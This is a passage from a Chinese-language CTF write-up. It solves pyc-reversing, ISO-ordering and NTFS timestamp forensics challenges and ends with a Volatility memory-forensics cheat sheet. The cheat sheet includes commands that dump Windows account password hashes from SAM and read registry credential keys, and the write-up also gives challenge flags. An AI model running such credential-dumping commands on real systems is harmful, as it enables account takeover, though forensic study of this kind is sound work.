    idx = int(re.search(r'(\d+)-\d+/1987', n)[1])
    idx_list.append(idx)
    total[idx] = data

print(total)
t = b''.join(total)
# t = ''.join(total)
# print(len(t)/2)
with open('decode.pyc', 'wb') as f:
    f.write(t)
# with open('decode1.pyc', 'w') as f:
#     f.write(t)
```

或者直接命令行用 tshark 更快，不过当时就没想到这么写喵呜呜呜。

按 index 把这个合并就行，bash 脚本类似这样

```
tshark -r ExtremelySlow.pcapng -T fields -e data -Y "http.response.line == \"content-range: bytes $idx-$idx/1987\x0d\x0a\"" 2&gt;/dev/null
```

根据文件内容得知是个 pyc 文件。

但是直接拿在线工具或者 uncompyle6 反编译都不成，发现 magic number 有误。

> 参考
[Python’s magic numbers](http://www.robertholmes.org/2018/09/08/pythons-magic-numbers.html)
[Python Uncompyle6 反编译工具使用 与 Magic Number 详解](https://blog.csdn.net/Zheng__Huang/article/details/112380221)
[https://github.com/google/pytype/blob/master/pytype/pyc/magic.py](https://github.com/google/pytype/blob/master/pytype/pyc/magic.py)
[Understanding Python Bytecode](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)

可以发现文件头的这个 magic number 是随版本号递增的，而且比最新的 3.9.5 跨了一大截。

于是考虑拉个 py3.10 的镜像下来。

```
docker run --rm -it  python:3.10.0b2
```

根据 magic number 确定就是最新的 Python 3.10.0b2

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b053054cb5f79852.png)

但还是需要反编译这个pyc

[uncompyle6](https://github.com/rocky/python-uncompyle6/) [https://pypi.org/project/uncompyle6/](https://pypi.org/project/uncompyle6/) 目前只支持 python 2.4-3.8

[https://github.com/rocky/python-decompile3](https://github.com/rocky/python-decompile3) 不行

dis 可

```
&gt;&gt;&gt; import marshal, dis
&gt;&gt;&gt; with open('decode.pyc','rb') as f:
...     metadata = f.read(16)
...     code_obj = marshal.load(f)
... 
&gt;&gt;&gt; dis.dis(code_obj)
  4           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (None)
              4 IMPORT_NAME              0 (sys)
              6 STORE_NAME               0 (sys)

  6           8 LOAD_CONST               0 (0)
             10 LOAD_CONST               2 (('sha256',))
             12 IMPORT_NAME              1 (hashlib)
             14 IMPORT_FROM              2 (sha256)
             16 STORE_NAME               2 (sha256)
             18 POP_TOP

 16          20 LOAD_CONST               3 (&lt;code object KSA at 0x7f1199dc7890, file "main.py", line 6&gt;)
             22 LOAD_CONST               4 ('KSA')
             24 MAKE_FUNCTION            0
             26 STORE_NAME               3 (KSA)

 26          28 LOAD_CONST               5 (&lt;code object PRGA at 0x7f1199dc7940, file "main.py", line 16&gt;)
             30 LOAD_CONST               6 ('PRGA')
             32 MAKE_FUNCTION            0
             34 STORE_NAME               4 (PRGA)

 30          36 LOAD_CONST               7 (&lt;code object RC4 at 0x7f1199dc7aa0, file "main.py", line 26&gt;)
             38 LOAD_CONST               8 ('RC4')
             40 MAKE_FUNCTION            0
             42 STORE_NAME               5 (RC4)

 33          44 LOAD_CONST               9 (&lt;code object xor at 0x7f1199dd4500, file "main.py", line 30&gt;)
             46 LOAD_CONST              10 ('xor')
             48 MAKE_FUNCTION            0
             50 STORE_NAME               6 (xor)

 34          52 LOAD_NAME                7 (__name__)
             54 LOAD_CONST              11 ('__main__')
             56 COMPARE_OP               2 (==)
             58 POP_JUMP_IF_FALSE      139 (to 278)

 35          60 LOAD_CONST              12 (b'\xf6\xef\x10H\xa9\x0f\x9f\xb5\x80\xc1xd\xae\xd3\x03\xb2\x84\xc2\xb4\x0e\xc8\xf3&lt;\x151\x19\n\x8f')
             62 STORE_NAME               8 (w)

 38          64 LOAD_CONST              13 (b'$\r9\xa3\x18\xddW\xc9\x97\xf3\xa7\xa8R~')
             66 STORE_NAME               9 (e)

 39          68 LOAD_CONST              14 (b'geo')
             70 STORE_NAME              10 (b)

 41          72 LOAD_CONST              15 (b'`}`\xce`\xbej\xa2\x120\xb5\x8a\x94\x14`{`\xa3\x86\xc8\xc7\x01\x98\xa3_\x91\xd8\x82T*V\xab\xe0\xa1\x141')
             74 STORE_NAME              11 (s)

 42          76 LOAD_CONST              16 (b"Q_\xe2\xf8\x8c\x11M`}`'&lt;@\xceT\xf6?_m\xa4\xf8\xb4\xea\xca\xc7:\xb9\xe6\x06\x8b\xeb\xfabH\x85xJ3$\xdd\xde\xb6\xdc\xa0\xb8b\x961\xb7\x13=\x17\x13\xb1")
             78 STORE_NAME              12 (t)

 43          80 LOAD_CONST              17 (115)
             82 LOAD_CONST              18 (97)
             84 LOAD_CONST              19 (117)
             86 LOAD_CONST              20 (114)
             88 LOAD_CONST              21 ((2, 8, 11, 10))
             90 BUILD_CONST_KEY_MAP      4
             92 STORE_NAME              13 (m)

 44          94 LOAD_CONST              22 (119)
             96 LOAD_CONST              23 (116)
             98 LOAD_CONST              24 (124)
            100 LOAD_CONST              25 (127)
            102 LOAD_CONST              26 ((3, 7, 9, 12))
            104 BUILD_CONST_KEY_MAP      4
            106 STORE_NAME              14 (n)

 45         108 LOAD_NAME               13 (m)
            110 LOAD_CONST              27 (&lt;code object &lt;dictcomp&gt; at 0x7f1199dd4c90, file "main.py", line 44&gt;)
            112 LOAD_CONST              28 ('&lt;dictcomp&gt;')
            114 MAKE_FUNCTION            0
            116 LOAD_NAME               14 (n)
            118 GET_ITER
            120 CALL_FUNCTION            1
            122 INPLACE_OR
            124 STORE_NAME              13 (m)

 47         126 LOAD_NAME               13 (m)
            128 LOAD_CONST              29 (&lt;code object &lt;genexpr&gt; at 0x7f1199dd5b00, file "main.py", line 45&gt;)
            130 LOAD_CONST              30 ('&lt;genexpr&gt;')
            132 MAKE_FUNCTION            0
            134 LOAD_NAME               10 (b)
            136 GET_ITER
            138 CALL_FUNCTION            1
            140 INPLACE_OR
            142 STORE_NAME              13 (m)

 48         144 LOAD_NAME                5 (RC4)
            146 LOAD_NAME               15 (list)
            148 LOAD_NAME               16 (map)
            150 LOAD_CONST              31 (&lt;code object &lt;lambda&gt; at 0x7f1199a42d90, file "main.py", line 47&gt;)
            152 LOAD_CONST              32 ('&lt;lambda&gt;')
            154 MAKE_FUNCTION            0
            156 LOAD_NAME               17 (sorted)
            158 LOAD_NAME               13 (m)
            160 LOAD_METHOD             18 (items)
            162 CALL_METHOD              0
            164 CALL_FUNCTION            1
            166 CALL_FUNCTION            2
            168 CALL_FUNCTION            1
            170 CALL_FUNCTION            1
            172 STORE_NAME              19 (stream)

 49         174 LOAD_NAME               20 (print)
            176 LOAD_NAME                6 (xor)
            178 LOAD_NAME                8 (w)
            180 LOAD_NAME               19 (stream)
            182 CALL_FUNCTION            2
            184 LOAD_METHOD             21 (decode)
            186 CALL_METHOD              0
            188 CALL_FUNCTION            1
            190 POP_TOP

 50         192 LOAD_NAME                0 (sys)
            194 LOAD_ATTR               22 (stdin)
            196 LOAD_ATTR               23 (buffer)
            198 LOAD_METHOD             24 (read)
            200 CALL_METHOD              0
            202 STORE_NAME              25 (p)

 52         204 LOAD_NAME                6 (xor)
            206 LOAD_NAME                9 (e)
            208 LOAD_NAME               19 (stream)
            210 CALL_FUNCTION            2
            212 STORE_NAME               9 (e)

 53         214 LOAD_NAME                6 (xor)
            216 LOAD_NAME               25 (p)
            218 LOAD_NAME               19 (stream)
            220 CALL_FUNCTION            2
            222 STORE_NAME              26 (c)

 54         224 LOAD_NAME                2 (sha256)
            226 LOAD_NAME               26 (c)
            228 CALL_FUNCTION            1
            230 LOAD_METHOD             27 (digest)
            232 CALL_METHOD              0
            234 LOAD_NAME               11 (s)
            236 COMPARE_OP               2 (==)
            238 POP_JUMP_IF_FALSE      131 (to 262)

 56         240 LOAD_NAME               20 (print)
            242 LOAD_NAME                6 (xor)
            244 LOAD_NAME               12 (t)
            246 LOAD_NAME               19 (stream)
            248 CALL_FUNCTION            2
            250 LOAD_METHOD             21 (decode)
            252 CALL_METHOD              0
            254 CALL_FUNCTION            1
            256 POP_TOP
            258 LOAD_CONST               1 (None)
            260 RETURN_VALUE

 33     &gt;&gt;  262 LOAD_NAME               20 (print)
            264 LOAD_NAME                9 (e)
            266 LOAD_METHOD             21 (decode)
            268 CALL_METHOD              0
            270 CALL_FUNCTION            1
            272 POP_TOP
            274 LOAD_CONST               1 (None)
            276 RETURN_VALUE
        &gt;&gt;  278 LOAD_CONST               1 (None)
            280 RETURN_VALUE

Disassembly of &lt;code object KSA at 0x7f1199dc7890, file "main.py", line 6&gt;:
  8           0 LOAD_GLOBAL              0 (len)
              2 LOAD_FAST                0 (key)
              4 CALL_FUNCTION            1
              6 STORE_FAST               1 (keylength)

  9           8 LOAD_GLOBAL              1 (list)
             10 LOAD_GLOBAL              2 (range)
             12 LOAD_CONST               1 (256)
             14 CALL_FUNCTION            1
             16 CALL_FUNCTION            1
             18 STORE_FAST               2 (S)

 10          20 LOAD_CONST               2 (0)
             22 STORE_FAST               3 (j)

 11          24 LOAD_GLOBAL              2 (range)
             26 LOAD_CONST               1 (256)
             28 CALL_FUNCTION            1
             30 GET_ITER
        &gt;&gt;   32 FOR_ITER                29 (to 92)
             34 STORE_FAST               4 (i)

 12          36 LOAD_FAST                3 (j)
             38 LOAD_FAST                2 (S)
             40 LOAD_FAST                4 (i)
             42 BINARY_SUBSCR
             44 BINARY_ADD
             46 LOAD_FAST                0 (key)
             48 LOAD_FAST                4 (i)
             50 LOAD_FAST                1 (keylength)
             52 BINARY_MODULO
             54 BINARY_SUBSCR
             56 BINARY_ADD
             58 LOAD_CONST               1 (256)
             60 BINARY_MODULO
             62 STORE_FAST               3 (j)

 13          64 LOAD_FAST                2 (S)
             66 LOAD_FAST                3 (j)
             68 BINARY_SUBSCR
             70 LOAD_FAST                2 (S)
             72 LOAD_FAST                4 (i)
             74 BINARY_SUBSCR
             76 ROT_TWO
             78 LOAD_FAST                2 (S)
             80 LOAD_FAST                4 (i)
             82 STORE_SUBSCR
             84 LOAD_FAST                2 (S)
             86 LOAD_FAST                3 (j)
             88 STORE_SUBSCR
             90 JUMP_ABSOLUTE           16 (to 32)
        &gt;&gt;   92 LOAD_FAST                2 (S)
             94 RETURN_VALUE

Disassembly of &lt;code object PRGA at 0x7f1199dc7940, file "main.py", line 16&gt;:
 17           0 GEN_START                0

 18           2 LOAD_CONST               1 (0)
              4 STORE_FAST               1 (i)

 19           6 LOAD_CONST               1 (0)
              8 STORE_FAST               2 (j)

 20          10 NOP

 21     &gt;&gt;   12 LOAD_FAST                1 (i)
             14 LOAD_CONST               3 (1)
             16 BINARY_ADD
             18 LOAD_CONST               4 (256)
             20 BINARY_MODULO
             22 STORE_FAST               1 (i)

 22          24 LOAD_FAST                2 (j)
             26 LOAD_FAST                0 (S)
             28 LOAD_FAST                1 (i)
             30 BINARY_SUBSCR
             32 BINARY_ADD
             34 LOAD_CONST               4 (256)
             36 BINARY_MODULO
             38 STORE_FAST               2 (j)

 23          40 LOAD_FAST                0 (S)
             42 LOAD_FAST                2 (j)
             44 BINARY_SUBSCR
             46 LOAD_FAST                0 (S)
             48 LOAD_FAST                1 (i)
             50 BINARY_SUBSCR
             52 ROT_TWO
             54 LOAD_FAST                0 (S)
             56 LOAD_FAST                1 (i)
             58 STORE_SUBSCR
             60 LOAD_FAST                0 (S)
             62 LOAD_FAST                2 (j)
             64 STORE_SUBSCR

 24          66 LOAD_FAST                0 (S)
             68 LOAD_FAST                0 (S)
             70 LOAD_FAST                1 (i)
             72 BINARY_SUBSCR
             74 LOAD_FAST                0 (S)
             76 LOAD_FAST                2 (j)
             78 BINARY_SUBSCR
             80 BINARY_ADD
             82 LOAD_CONST               4 (256)
             84 BINARY_MODULO
             86 BINARY_SUBSCR
             88 STORE_FAST               3 (K)

 19          90 LOAD_FAST                3 (K)
             92 YIELD_VALUE
             94 POP_TOP
             96 JUMP_ABSOLUTE            6 (to 12)

Disassembly of &lt;code object RC4 at 0x7f1199dc7aa0, file "main.py", line 26&gt;:
 28           0 LOAD_GLOBAL              0 (KSA)
              2 LOAD_FAST                0 (key)
              4 CALL_FUNCTION            1
              6 STORE_FAST               1 (S)
              8 LOAD_GLOBAL              1 (PRGA)
             10 LOAD_FAST                1 (S)
             12 CALL_FUNCTION            1
             14 RETURN_VALUE

Disassembly of &lt;code object xor at 0x7f1199dd4500, file "main.py", line 30&gt;:
 31           0 LOAD_GLOBAL              0 (bytes)
              2 LOAD_GLOBAL              1 (map)
              4 LOAD_CLOSURE             0 (stream)
              6 BUILD_TUPLE              1
              8 LOAD_CONST               1 (&lt;code object &lt;lambda&gt; at 0x7f1199dd5dc0, file "main.py", line 31&gt;)
             10 LOAD_CONST               2 ('xor.&lt;locals&gt;.&lt;lambda&gt;')
             12 MAKE_FUNCTION            8 (closure)
             14 LOAD_FAST                0 (p)
             16 CALL_FUNCTION            2
             18 CALL_FUNCTION            1
             20 RETURN_VALUE

Disassembly of &lt;code object &lt;lambda&gt; at 0x7f1199dd5dc0, file "main.py", line 31&gt;:
          0 LOAD_FAST                0 (x)
          2 LOAD_DEREF               0 (stream)
          4 LOAD_METHOD              0 (__next__)
          6 CALL_METHOD              0
          8 BINARY_XOR
         10 RETURN_VALUE

Disassembly of &lt;code object &lt;dictcomp&gt; at 0x7f1199dd4c90, file "main.py", line 44&gt;:
          0 BUILD_MAP                0
          2 LOAD_FAST                0 (.0)
    &gt;&gt;    4 FOR_ITER                 9 (to 24)
          6 STORE_FAST               1 (x)
          8 LOAD_FAST                1 (x)
         10 LOAD_FAST                1 (x)
         12 LOAD_GLOBAL              0 (n)
         14 LOAD_FAST                1 (x)
         16 BINARY_SUBSCR
         18 BINARY_XOR
         20 MAP_ADD                  2
         22 JUMP_ABSOLUTE            2 (to 4)
    &gt;&gt;   24 RETURN_VALUE

Disassembly of &lt;code object &lt;genexpr&gt; at 0x7f1199dd5b00, file "main.py", line 45&gt;:
          0 GEN_START                0
          2 LOAD_FAST                0 (.0)
    &gt;&gt;    4 FOR_ITER                 9 (to 24)
          6 STORE_FAST               1 (i)
          8 LOAD_FAST                1 (i)
         10 LOAD_METHOD              0 (bit_count)
         12 CALL_METHOD              0
         14 LOAD_FAST                1 (i)
         16 BUILD_TUPLE              2
         18 YIELD_VALUE
         20 POP_TOP
         22 JUMP_ABSOLUTE            2 (to 4)
    &gt;&gt;   24 LOAD_CONST               0 (None)
         26 RETURN_VALUE

Disassembly of &lt;code object &lt;lambda&gt; at 0x7f1199a42d90, file "main.py", line 47&gt;:
          0 LOAD_FAST                0 (x)
          2 LOAD_CONST               1 (1)
          4 BINARY_SUBSCR
          6 RETURN_VALUE
```

人工手动逆向得到对应 python 代码大概如下

（有些地方没有完全按照字节码来写

```
import sys
from hashlib import sha256

w = b'\xf6\xef\x10H\xa9\x0f\x9f\xb5\x80\xc1xd\xae\xd3\x03\xb2\x84\xc2\xb4\x0e\xc8\xf3&lt;\x151\x19\n\x8f'    

e = b'$\r9\xa3\x18\xddW\xc9\x97\xf3\xa7\xa8R~'
b = b'geo'

s = b'`}`\xce`\xbej\xa2\x120\xb5\x8a\x94\x14`{`\xa3\x86\xc8\xc7\x01\x98\xa3_\x91\xd8\x82T*V\xab\xe0\xa1\x141'
t = b"Q_\xe2\xf8\x8c\x11M`}`'&lt;@\xceT\xf6?_m\xa4\xf8\xb4\xea\xca\xc7:\xb9\xe6\x06\x8b\xeb\xfabH\x85xJ3$\xdd\xde\xb6\xdc\xa0\xb8b\x961\xb7\x13=\x17\x13\xb1"
m = `{`2:115, 8:97, 11:117, 10:114`}`
n = `{`3:119, 7:116, 9:124, 12:127`}`

def KSA(key):
    keylength = len(key)

    S = list(range(256))

    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % keylength]) % 256
        S[i], S[j] = S[j], S[i]

    return S

def PRGA(S):
    i = 0
    j = 0
    while True:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]

        K = S[(S[i] + S[j]) % 256]
        yield K

def RC4(key):
    S = KSA(key)
    return PRGA(S)

def xor(p,stream):
    return bytes(map(lambda x:x ^ stream.__next__(), p))

# n = `{`2:115, 8:97, 11:117, 10:114`}`
# x:x^n[x] -&gt; &lt;dictcomp&gt; 
m |= `{`x: x^n[x] for x in n`}`
m |= ((i.bit_count(), i) for i in b)
stream = RC4(list(map(lambda m:m[1], sorted(m.items()))))
# print welcome banner...
# print(stream)

print(xor(w, stream).decode())
p = sys.stdin.buffer.readline()
e = xor(e, stream)
# print(e)
c = xor(p, stream)

if sha256(c).digest() != s:  # error
    print(e.decode())
    exit()

print(xor(t, stream))  # true?
```

大约可以直到，这个地方通过爆破输入字符的长度，得到`t`的真实数据

可以发现，输入长度为 26 的时候，会提示说 `Congratulations! Now you should now what the flag is`，这个就是 `t` 的解密结果。而其他情况都不能正确解码。

于是就去找哪里还有这个输入。

然后发现用 pyc 隐写了一部分内容，使用脚本 stegosaurus 导出 pyc 隐写。

> [一文让你完全弄懂Stegosaurus](https://zhuanlan.zhihu.com/p/51226097)
[https://github.com/AngelKitty/stegosaurus](https://github.com/AngelKitty/stegosaurus)

需要魔改一下 header，python 3.10 长度是16.

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0167cda1e41201c607.png)

另外输出的话不用转 str，直接 bytes 就好了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t019f696f54a66b733f.png)

得到长度为 26 的 bytes

```
b'\xe5\n2\xd6"\xf0`}`I\xb0\xcd\xa2\x11\xf0\xb4U\x166\xc5o\xdb\xc9\xead\x04\x15b'
```

最后将这个作为输入，然后让上述代码的 `c` 打印出来，即为 flag

`flag`{`P0w5rFu1_0pEn_50urcE`}``

### <a class="reference-link" name="ISO1995"></a>ISO1995

> We follow ISO1995. ISO1995 has many problems though. One known problem is a time.
[附件下载](https://pan.baidu.com/s/1vNY8AzzLVkxbq90h2cW6NQ) 提取码（GAME）[备用下载](https://share.weiyun.com/lkcBIbbi)
压缩包解压密码：fantasicqwb2021

下载下来以 `iso9660` 挂载

```
mount -t iso9660 iso1995 /mnt/随便一个目录
```

发现有一堆名为 `flag_fxxxxx` （xxxx为数字）的文件。

用 ultraISO 把文件导出来，发现每个文件只有一个字符。

另外根据题目提示，查看 hex 发现他每个文件名之前的 `FFFFFFFF` 之后跟着的 2bytes 都不同，怀疑是个序号或者时间之类的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a1d8536733b2493a.png)

于是写个脚本提取，转成十进制作为文件名并按照这个顺序把文件内容读取出来。

```
import re

with open('iso1995_trunk_hex', 'r', encoding='utf-8') as fin:
    s = fin.read()

s = s.strip().replace(' ', '').replace('\n', '')
print(s)

# FFFFFFFF027D08020000010000011A0066006C00610067005F006600300031003000310031003B0031003C0041040000000004410100000000000001
# FFFFFFFF001E08020000010000011A0066006C00610067005F006600300031003000300038003B0031003C003E0400000000043E0100000000000001
# FFFFFFFF011208020000010000011A0066006C00610067005F006600300030003900340032003B0031003C00FC030000000003FC0100000000000001

re_num = re.compile(
    r'FFFFFFFF(\w`{`4`}`)08020000010000011A0066006C00610067005F006600(\w`{`18`}`)')

l = re_num.findall(s)

len(l)
# 1024

filename_list = []
for i in l:
    name = int(i[0], 16)
    # print(name)
    filename_list.append(name)

decode_str2 = ''
for i in filename_list:
    filename = f'./iso1995file/flag_f`{`str(i).rjust(5, "0")`}`'
    with open(filename, 'r', encoding='utf-8') as f:
        x = f.read()
        print(x)
        decode_str2 += x
print(decode_str2)

# !Sdk*t eiW!BJ9$QpR. pIk`{`V#t:NE;J8M`{`Qi&gt;W%|1vw&lt;9_*2AG\SX_6`{`)'n4)GwcPx8gp[6Z_'.#Y(=zCs/2*^DwpC6@=KBz\+0ngA@C(cJSiE'ShHjW,*Xu`{`Y&gt;5rGyMWX_mY,htG1KLE`pNNMYd?U\SF&lt;%O,qeVflr$,CO@V.s-%.@C'&amp;I2[36?&lt;k)N^Z0~IgP-k=L-Ip0URu_&lt;P6T?/LF\~K~q6%76`}`!_WR&amp;nojVK`KGYZwx"G4^4=&amp;cOO0&amp;%:QWo~cBBUM#LD$gLK?887&lt;a$z/Xh=V(J`jus9Jw-Pmp1=[|b5;"Z`{`[qNI&amp;9/.2@b&gt;'Vxo `{`1)xT_'3FoRIP~O`&amp;!K'ZAKM&lt;Hrg$D_*&gt;8G%UT`{`oN41|4P42S~6*g2KJ`}`o,8j/]&amp;FimP0V2c::+`{`#;Bj@Cd\w9ioA&amp;is#g#6!_9SI4Xx6rKoN ZhzD##,4!/bbB(v/Q(6ez`{`bKoH'-B'*hg5xq$n0xz 0v9wfbGs|[K-ana]D!+*\+`abDa7w16BySRx-#D/-a1O55Q`F&lt;75`{`8f)4rlgQW]K=oT1J$Ar= W$LW9!~TphteN=b&amp;s`}`.714G_8W~!@8=%gh%"K:&lt;@7o*5+y+`}`+fCF'NEYN0`{`P4T_hz(3|Y7ZA1fsu\B6bxi#_+wKPs^C1^Ywa,`{`'&amp;i]Hq+P8&lt;WQ5sKu!abFLAG`{`Dir3ct0ry_jYa_n41`}`R:k_#z^'mT?,3$H "W+xr-Yzn-D-ribi,wKf|&amp;$2:/q?8:jmcI|4L:+`KDx])5+A_m13/7R1VQ:[Dc&amp;.TcvPv$tOb`}`X&amp;-K'f:.&lt;,bO~0r,=olgKP&amp;x U %(HFjNtCDaJiHW+N1WK=(Ho_*K2&lt;^&gt;b&lt;&lt;_]~4rn=k#7i,3YHK_Z;o%8[xZy;:&lt;1`}`OT1IHSn&gt;gn`n;YI9[M't@v%`}`Iz0fmVl#ls+aI\: 6?|VvGHD~Q0O4`{`-.siztGve H&lt;f@kXEt@WWHW",81m*S1lbQZ+mK9rB'TD^)-)0TzO6tUGf5#6bFo&gt;L7,*oJ&amp;wL*`}`.7pRx"t1vzM):FL3r@:-C1
# FLAG`{`Dir3ct0ry_jYa_n41`}`
```

`FLAG`{`Dir3ct0ry_jYa_n41`}``

> 赛后发现这个又是原题。。
[2020 BingoCTF – ISO Solution.md](https://webcache.googleusercontent.com/search?q=cache:sleibHV0ffkJ:https://gist.github.com/iidx/70bc719bf5410080801e84406189cd49+&amp;cd=1&amp;hl=zh-CN&amp;ct=clnk)

### <a class="reference-link" name="EzTime"></a>EzTime

> Forensic.Find a file that a time attribute has been modified by a program. （本题flag为非正式形式）
[附件下载](https://pan.baidu.com/s/1tr-n3qcYOomsSeM8fEUYVg) 提取码（GAME）[备用下载](https://share.weiyun.com/UhRqdXaX)
压缩包解压密码：fantasicqwb2021

解压得到 `$LogFile`、`$MFT` (Master File Table)

> [File – $LogFile (2)](https://flatcap.org/linux-ntfs/ntfs/files/logfile.html)
[NTFS Timestamp changes on Windows 10](https://www.forensixchange.com/posts/19_04_22_win10_ntfs_time_rules/)
[Do you MFT? Here’s an MFT Overview.](https://community.rsa.com/t5/rsa-netwitness-platform-blog/do-you-mft-here-s-an-mft-overview/ba-p/519885)
[https://github.com/dkovar/analyzeMFT](https://github.com/dkovar/analyzeMFT)
[https://github.com/jschicht/LogFileParser](https://github.com/jschicht/LogFileParser)

最后又找到了个 [NTFS Log Tracker 工具](https://sites.google.com/site/forensicnote/ntfs-log-tracker)

导入之后可以看到相关信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c3c000fdba652265.png)

找了老半天时间参数被修改的文件，最后发现是这个（

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f168488d9ed24435.png)

可以把时间导出来发现秒以下都是 000000…

提交的 flag 就是

``{`45EF6FFC-F0B6-4000-A7C0-8D1549355A8C`}`.png`

### <a class="reference-link" name="%E9%97%AE%E5%8D%B7%E9%A2%98"></a>问卷题

`flag`{`Welc0me_tO_qwbS5_Hope_you_play_h4ppily`}``

## 小结

好几次比赛都出了内存取证的题目了，这里正好就整理一下吧。

```
volatility -f winxp.raw imageinfo                      # 查询镜像基本信息
volatility -f winxp.raw --profile=WinXPSP3x86 pstree   # 查运行进程进程树
volatility -f winxp.raw --profile=WinXPSP3x86 pslist   # 查正在运行的进程
volatility -f winxp.raw --profile=WinXPSP3x86 memdump -p 324 --dump-dir .    # 将PID=324的进程dump出来
volatility -f winxp.raw --profile=WinXPSP3x86 procdump -p 324 --dump-dir .   # 将PID=324进程导出为exe
volatility -f winxp.raw --profile=WinXPSP3x86 dlldump -p 324 --dump-dir .    # 将PID=324进程的所有DLL导出

volatility -f winxp.raw --profile=WinXPSP3x86 getsids -p 324  # 查询指定进程的SID
volatility -f winxp.raw --profile=WinXPSP3x86 dlllist -p 324  # 查询指定进程加载过的DLL
volatility -f winxp.raw --profile=WinXPSP3x86 threads -p 324  # 列出当前进程中活跃的线程
volatility -f winxp.raw --profile=WinXPSP3x86 drivermodule    # 列出目标中驱动加载情况
volatility -f winxp.raw --profile=WinXPSP3x86 malfind -p 324 -D .   # 检索内存读写执行页

volatility -f winxp.raw --profile=WinXPSP3x86 iehistory # 检索IE浏览器历史记录
volatility -f winxp.raw --profile=WinXPSP3x86 joblinks  # 检索计划任务
volatility -f winxp.raw --profile=WinXPSP3x86 cmdscan   # 只能检索命令行历史
volatility -f winxp.raw --profile=WinXPSP3x86 consoles  # 抓取控制台下执行的命令以及回显数据
volatility -f winxp.raw --profile=WinXPSP3x86 cmdline   # 列出所有命令行下运行的程序

volatility -f winxp.raw --profile=WinXPSP3x86 connscan    # 检索已经建立的网络链接
volatility -f winxp.raw --profile=WinXPSP3x86 connections # 检索已经建立的网络链接
volatility -f winxp.raw --profile=WinXPSP3x86 netscan     # 检索所有网络连接情况
volatility -f winxp.raw --profile=WinXPSP3x86 sockscan    # TrueCrypt摘要TrueCrypt摘要

volatility -f winxp.raw --profile=WinXPSP3x86 timeliner # 尽可能多的发现目标主机痕迹

volatility -f winxp.raw --profile=WinXPSP3x86 hivelist                                       # 检索所有注册表蜂巢
volatility -f winxp.raw --profile=WinXPSP3x86 hivedump -o 0xe144f758                         # 检索SAM注册表键值对
volatility -f winxp.raw --profile=WinXPSP3x86 dumpregistry -D .                         # 导出注册表
volatility -f winxp.raw --profile=WinXPSP3x86 printkey -K "SAM\Domains\Account\Users\Names"  # 检索注册表中账号密码
volatility -f winxp.raw --profile=WinXPSP3x86 hashdump -y system地址 -s SAM地址               # dump目标账号Hash值
volatility -f winxp.raw --profile=WinXPSP3x86 printkey -K "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # 查最后登录的用户

volatility -f winxp.raw --profile=WinXPSP3x86 userassist                                     # 查询程序运行次数
```

（参考了 [Volatility 内存数字取证方法](https://www.cnblogs.com/LyShark/p/12484763.html), thx

最后，感谢队友带喵喵一起玩 qwq！

顺便，欢迎大师傅们来 [咱博客](https://miaotony.xyz/?from=anquanke) 逛逛喵~

**（溜了溜了喵~**
